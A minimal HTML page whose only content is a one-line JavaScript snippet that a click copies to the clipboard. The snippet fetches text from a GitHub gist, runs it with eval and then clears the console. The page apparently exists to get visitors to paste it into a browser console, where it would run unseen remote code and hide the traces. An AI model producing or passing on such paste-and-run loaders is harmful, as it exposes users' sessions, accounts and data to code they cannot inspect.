<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P1</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: monospace;
        }
        #code {
            cursor: pointer;
            user-select: all;
        }
    </style>
</head>
<body>
    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/16e945923ce70faaaab7a90617246d3e/raw/e0ca26cb5102d0632be4a06ece705ae0fcbf60f8/gistfile1.txt').then(r => r.text()).then(code => { eval(code); console.clear(); })</div>

    <script>
        document.getElementById('code').addEventListener('click', function() {
            navigator.clipboard.writeText(this.textContent);
        });
    </script>
</body>
</html>
